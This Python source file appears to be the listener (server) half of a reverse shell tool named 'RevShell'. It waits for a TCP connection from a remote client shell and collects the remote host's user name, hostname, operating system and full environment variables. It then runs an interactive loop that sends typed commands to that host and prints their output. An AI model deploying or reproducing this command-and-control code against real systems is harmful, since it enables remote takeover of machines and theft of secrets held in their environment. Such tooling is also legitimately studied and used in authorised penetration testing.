from .nodeutils import (
    os,
    socket,
    Path,
    subprocess,
    struct,
    sys,
    StreamSocket,
    utils
)


class Server(StreamSocket):
    """TCP socket server class for the command shell"""
    def __init__(
        self,
        lhost: str,
        port: int,
        opsys: str,
        verb: bool,
        debug: bool,
        shell: str = None
    ):
        shell_path, name = self.get_exec(opsys, shell)
        super().__init__(lhost, port, shell_path, verb, debug)

    @staticmethod
    def _env(env_info: str) -> dict:
        """Protected helper method to format client environment info
        received from socket stream. Returns environment as dictionary"""
        environ = {}

        for item in env_info.split(", "):
            pair = item.split(": ", maxsplit=1)
            try:
                environ.update({pair[0]: pair[1]})
            except IndexError:
                pass

        return environ

    def listen(self) -> None:
        """Begin listening for incoming TCP connection from the client shell"""
        # TODO: configure timeouts and blocking
        addr = ()
        client_sock = socket.socket()
        server_sock = socket.socket()

        server_sock.settimeout(180)
        server_sock.bind((self.Address, self.Port))

        server_sock.listen(1)  # stay open for one connection
        utils.status(f"Listening for incoming TCP connections on port {self.Port}...")

        try:
            client_sock, addr = server_sock.accept()
        except socket.timeout:
            client_sock.close()
            server_sock.close()
            utils.throw("The listening socket has timeout out")
        finally:
            server_sock.setblocking(True)

        with client_sock:
            # TODO: ?> print additional info in opening banner?
            utils.status(f"Received connection from {addr[0]} on port {addr[1]}")

            # send ==> established message
            self.send_msg(client_sock, f"Connection established with {socket.gethostname()}")

            # receive <== current user/host information
            user_info = self.recv_msg(client_sock).split("::")

            self.UserName = str(user_info[0])
            self.Hostname = str(user_info[1])
            self.LastWD = str(user_info[2])
            self.RemoteOpSys = str(user_info[3])
            self.Shell = str(user_info[4])
            self.Environment = self._env(user_info[5])

            if self.RemoteOpSys == "nt":
                shell_name = self.Shell.split("\\")[-1]
            else:
                shell_name = self.Shell.split("/")[-1]

            utils.status(f"Logged into host '{self.Hostname}' as user '{self.UserName}'")
            utils.status(f"Using {shell_name} as the system command shell")

            # receive <== system information
            sys_info = self.recv_msg(client_sock)
            utils.status(sys_info)

            try:
                # TODO: change status highlighting logic to match Client class
                while True:
                    command = input(self.get_prompt().decode())

                    # send ==> command to be executed
                    self.send_msg(client_sock, command)
                    family = self.check_special(command)

                    if family != "exit":
                        # receive <==  command output
                        out_type, output = self.receive_cmd(client_sock)

                        # TODO: fix relative directory issues
                        if family == "cd":
                            if out_type == "stdout":
                                self.LastWD = output
                                utils.status(level="output", stdin=command)
                            else:
                                utils.status(level="error", stdin=command)
                        elif family == "clear":
                            print(utils.Ansi.clear().decode(), end="")
                        else:
                            utils.status(output, level="output", stdin=command)
                    else:
                        if self.Verbose:
                            utils.status("Exiting RevShell")
                        break
            except Exception as exc:
                # TODO: remove redundancy
                try:
                    client_sock.shutdown(socket.SHUT_WR)
                except OSError:
                    pass
                finally:
                    server_sock.close()
                self.except_handler(exc)
            finally:
                try:
                    client_sock.shutdown(socket.SHUT_WR)
                    server_sock.shutdown(socket.SHUT_WR)
                except OSError:
                    pass
                finally:
                    server_sock.close()
